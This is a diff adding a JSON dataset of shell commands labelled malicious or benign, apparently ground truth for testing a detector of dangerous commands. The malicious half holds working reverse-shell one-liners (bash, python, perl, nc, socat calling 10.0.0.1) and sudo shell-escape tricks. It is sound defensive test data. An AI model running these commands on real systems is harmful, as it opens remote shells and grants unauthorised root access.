@@ -1,0 +1,22 @@
+[
+  {"command": "sudo find / -exec /bin/sh \\;", "user": "www-data", "ground_truth": "malicious"},
+  {"command": "bash -i >& /dev/tcp/10.0.0.1/9999 0>&1", "user": "www-data", "ground_truth": "malicious"},
+  {"command": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'", "user": "www-data", "ground_truth": "malicious"},
+  {"command": "sudo vim -c ':!/bin/sh'", "user": "deploy", "ground_truth": "malicious"},
+  {"command": "nc -e /bin/sh 10.0.0.1 4444", "user": "www-data", "ground_truth": "malicious"},
+  {"command": "sudo awk 'BEGIN {system(\"/bin/sh\")}' /etc/hosts", "user": "backup", "ground_truth": "malicious"},
+  {"command": "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'", "user": "www-data", "ground_truth": "malicious"},
+  {"command": "sudo tar -cf /dev/null /etc --checkpoint=1 --checkpoint-action=exec=/bin/sh", "user": "backup", "ground_truth": "malicious"},
+  {"command": "socat TCP:10.0.0.1:4444 EXEC:/bin/sh", "user": "www-data", "ground_truth": "malicious"},
+  {"command": "sudo python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'", "user": "developer", "ground_truth": "malicious"},
+  {"command": "sudo apt-get update", "user": "root", "ground_truth": "benign"},
+  {"command": "ls -la /var/www", "user": "www-data", "ground_truth": "benign"},
+  {"command": "systemctl status nginx", "user": "root", "ground_truth": "benign"},
+  {"command": "cat /etc/hosts", "user": "developer", "ground_truth": "benign"},
+  {"command": "find /var/log -maxdepth 2 -type f", "user": "analyst", "ground_truth": "benign"},
+  {"command": "python3 --version", "user": "developer", "ground_truth": "benign"},
+  {"command": "tar -czf /tmp/logs.tar.gz /var/log", "user": "backup", "ground_truth": "benign"},
+  {"command": "sudo service nginx reload", "user": "root", "ground_truth": "benign"},
+  {"command": "grep -R 'error' /var/log/nginx", "user": "analyst", "ground_truth": "benign"},
+  {"command": "du -sh /var/www", "user": "www-data", "ground_truth": "benign"}
+]
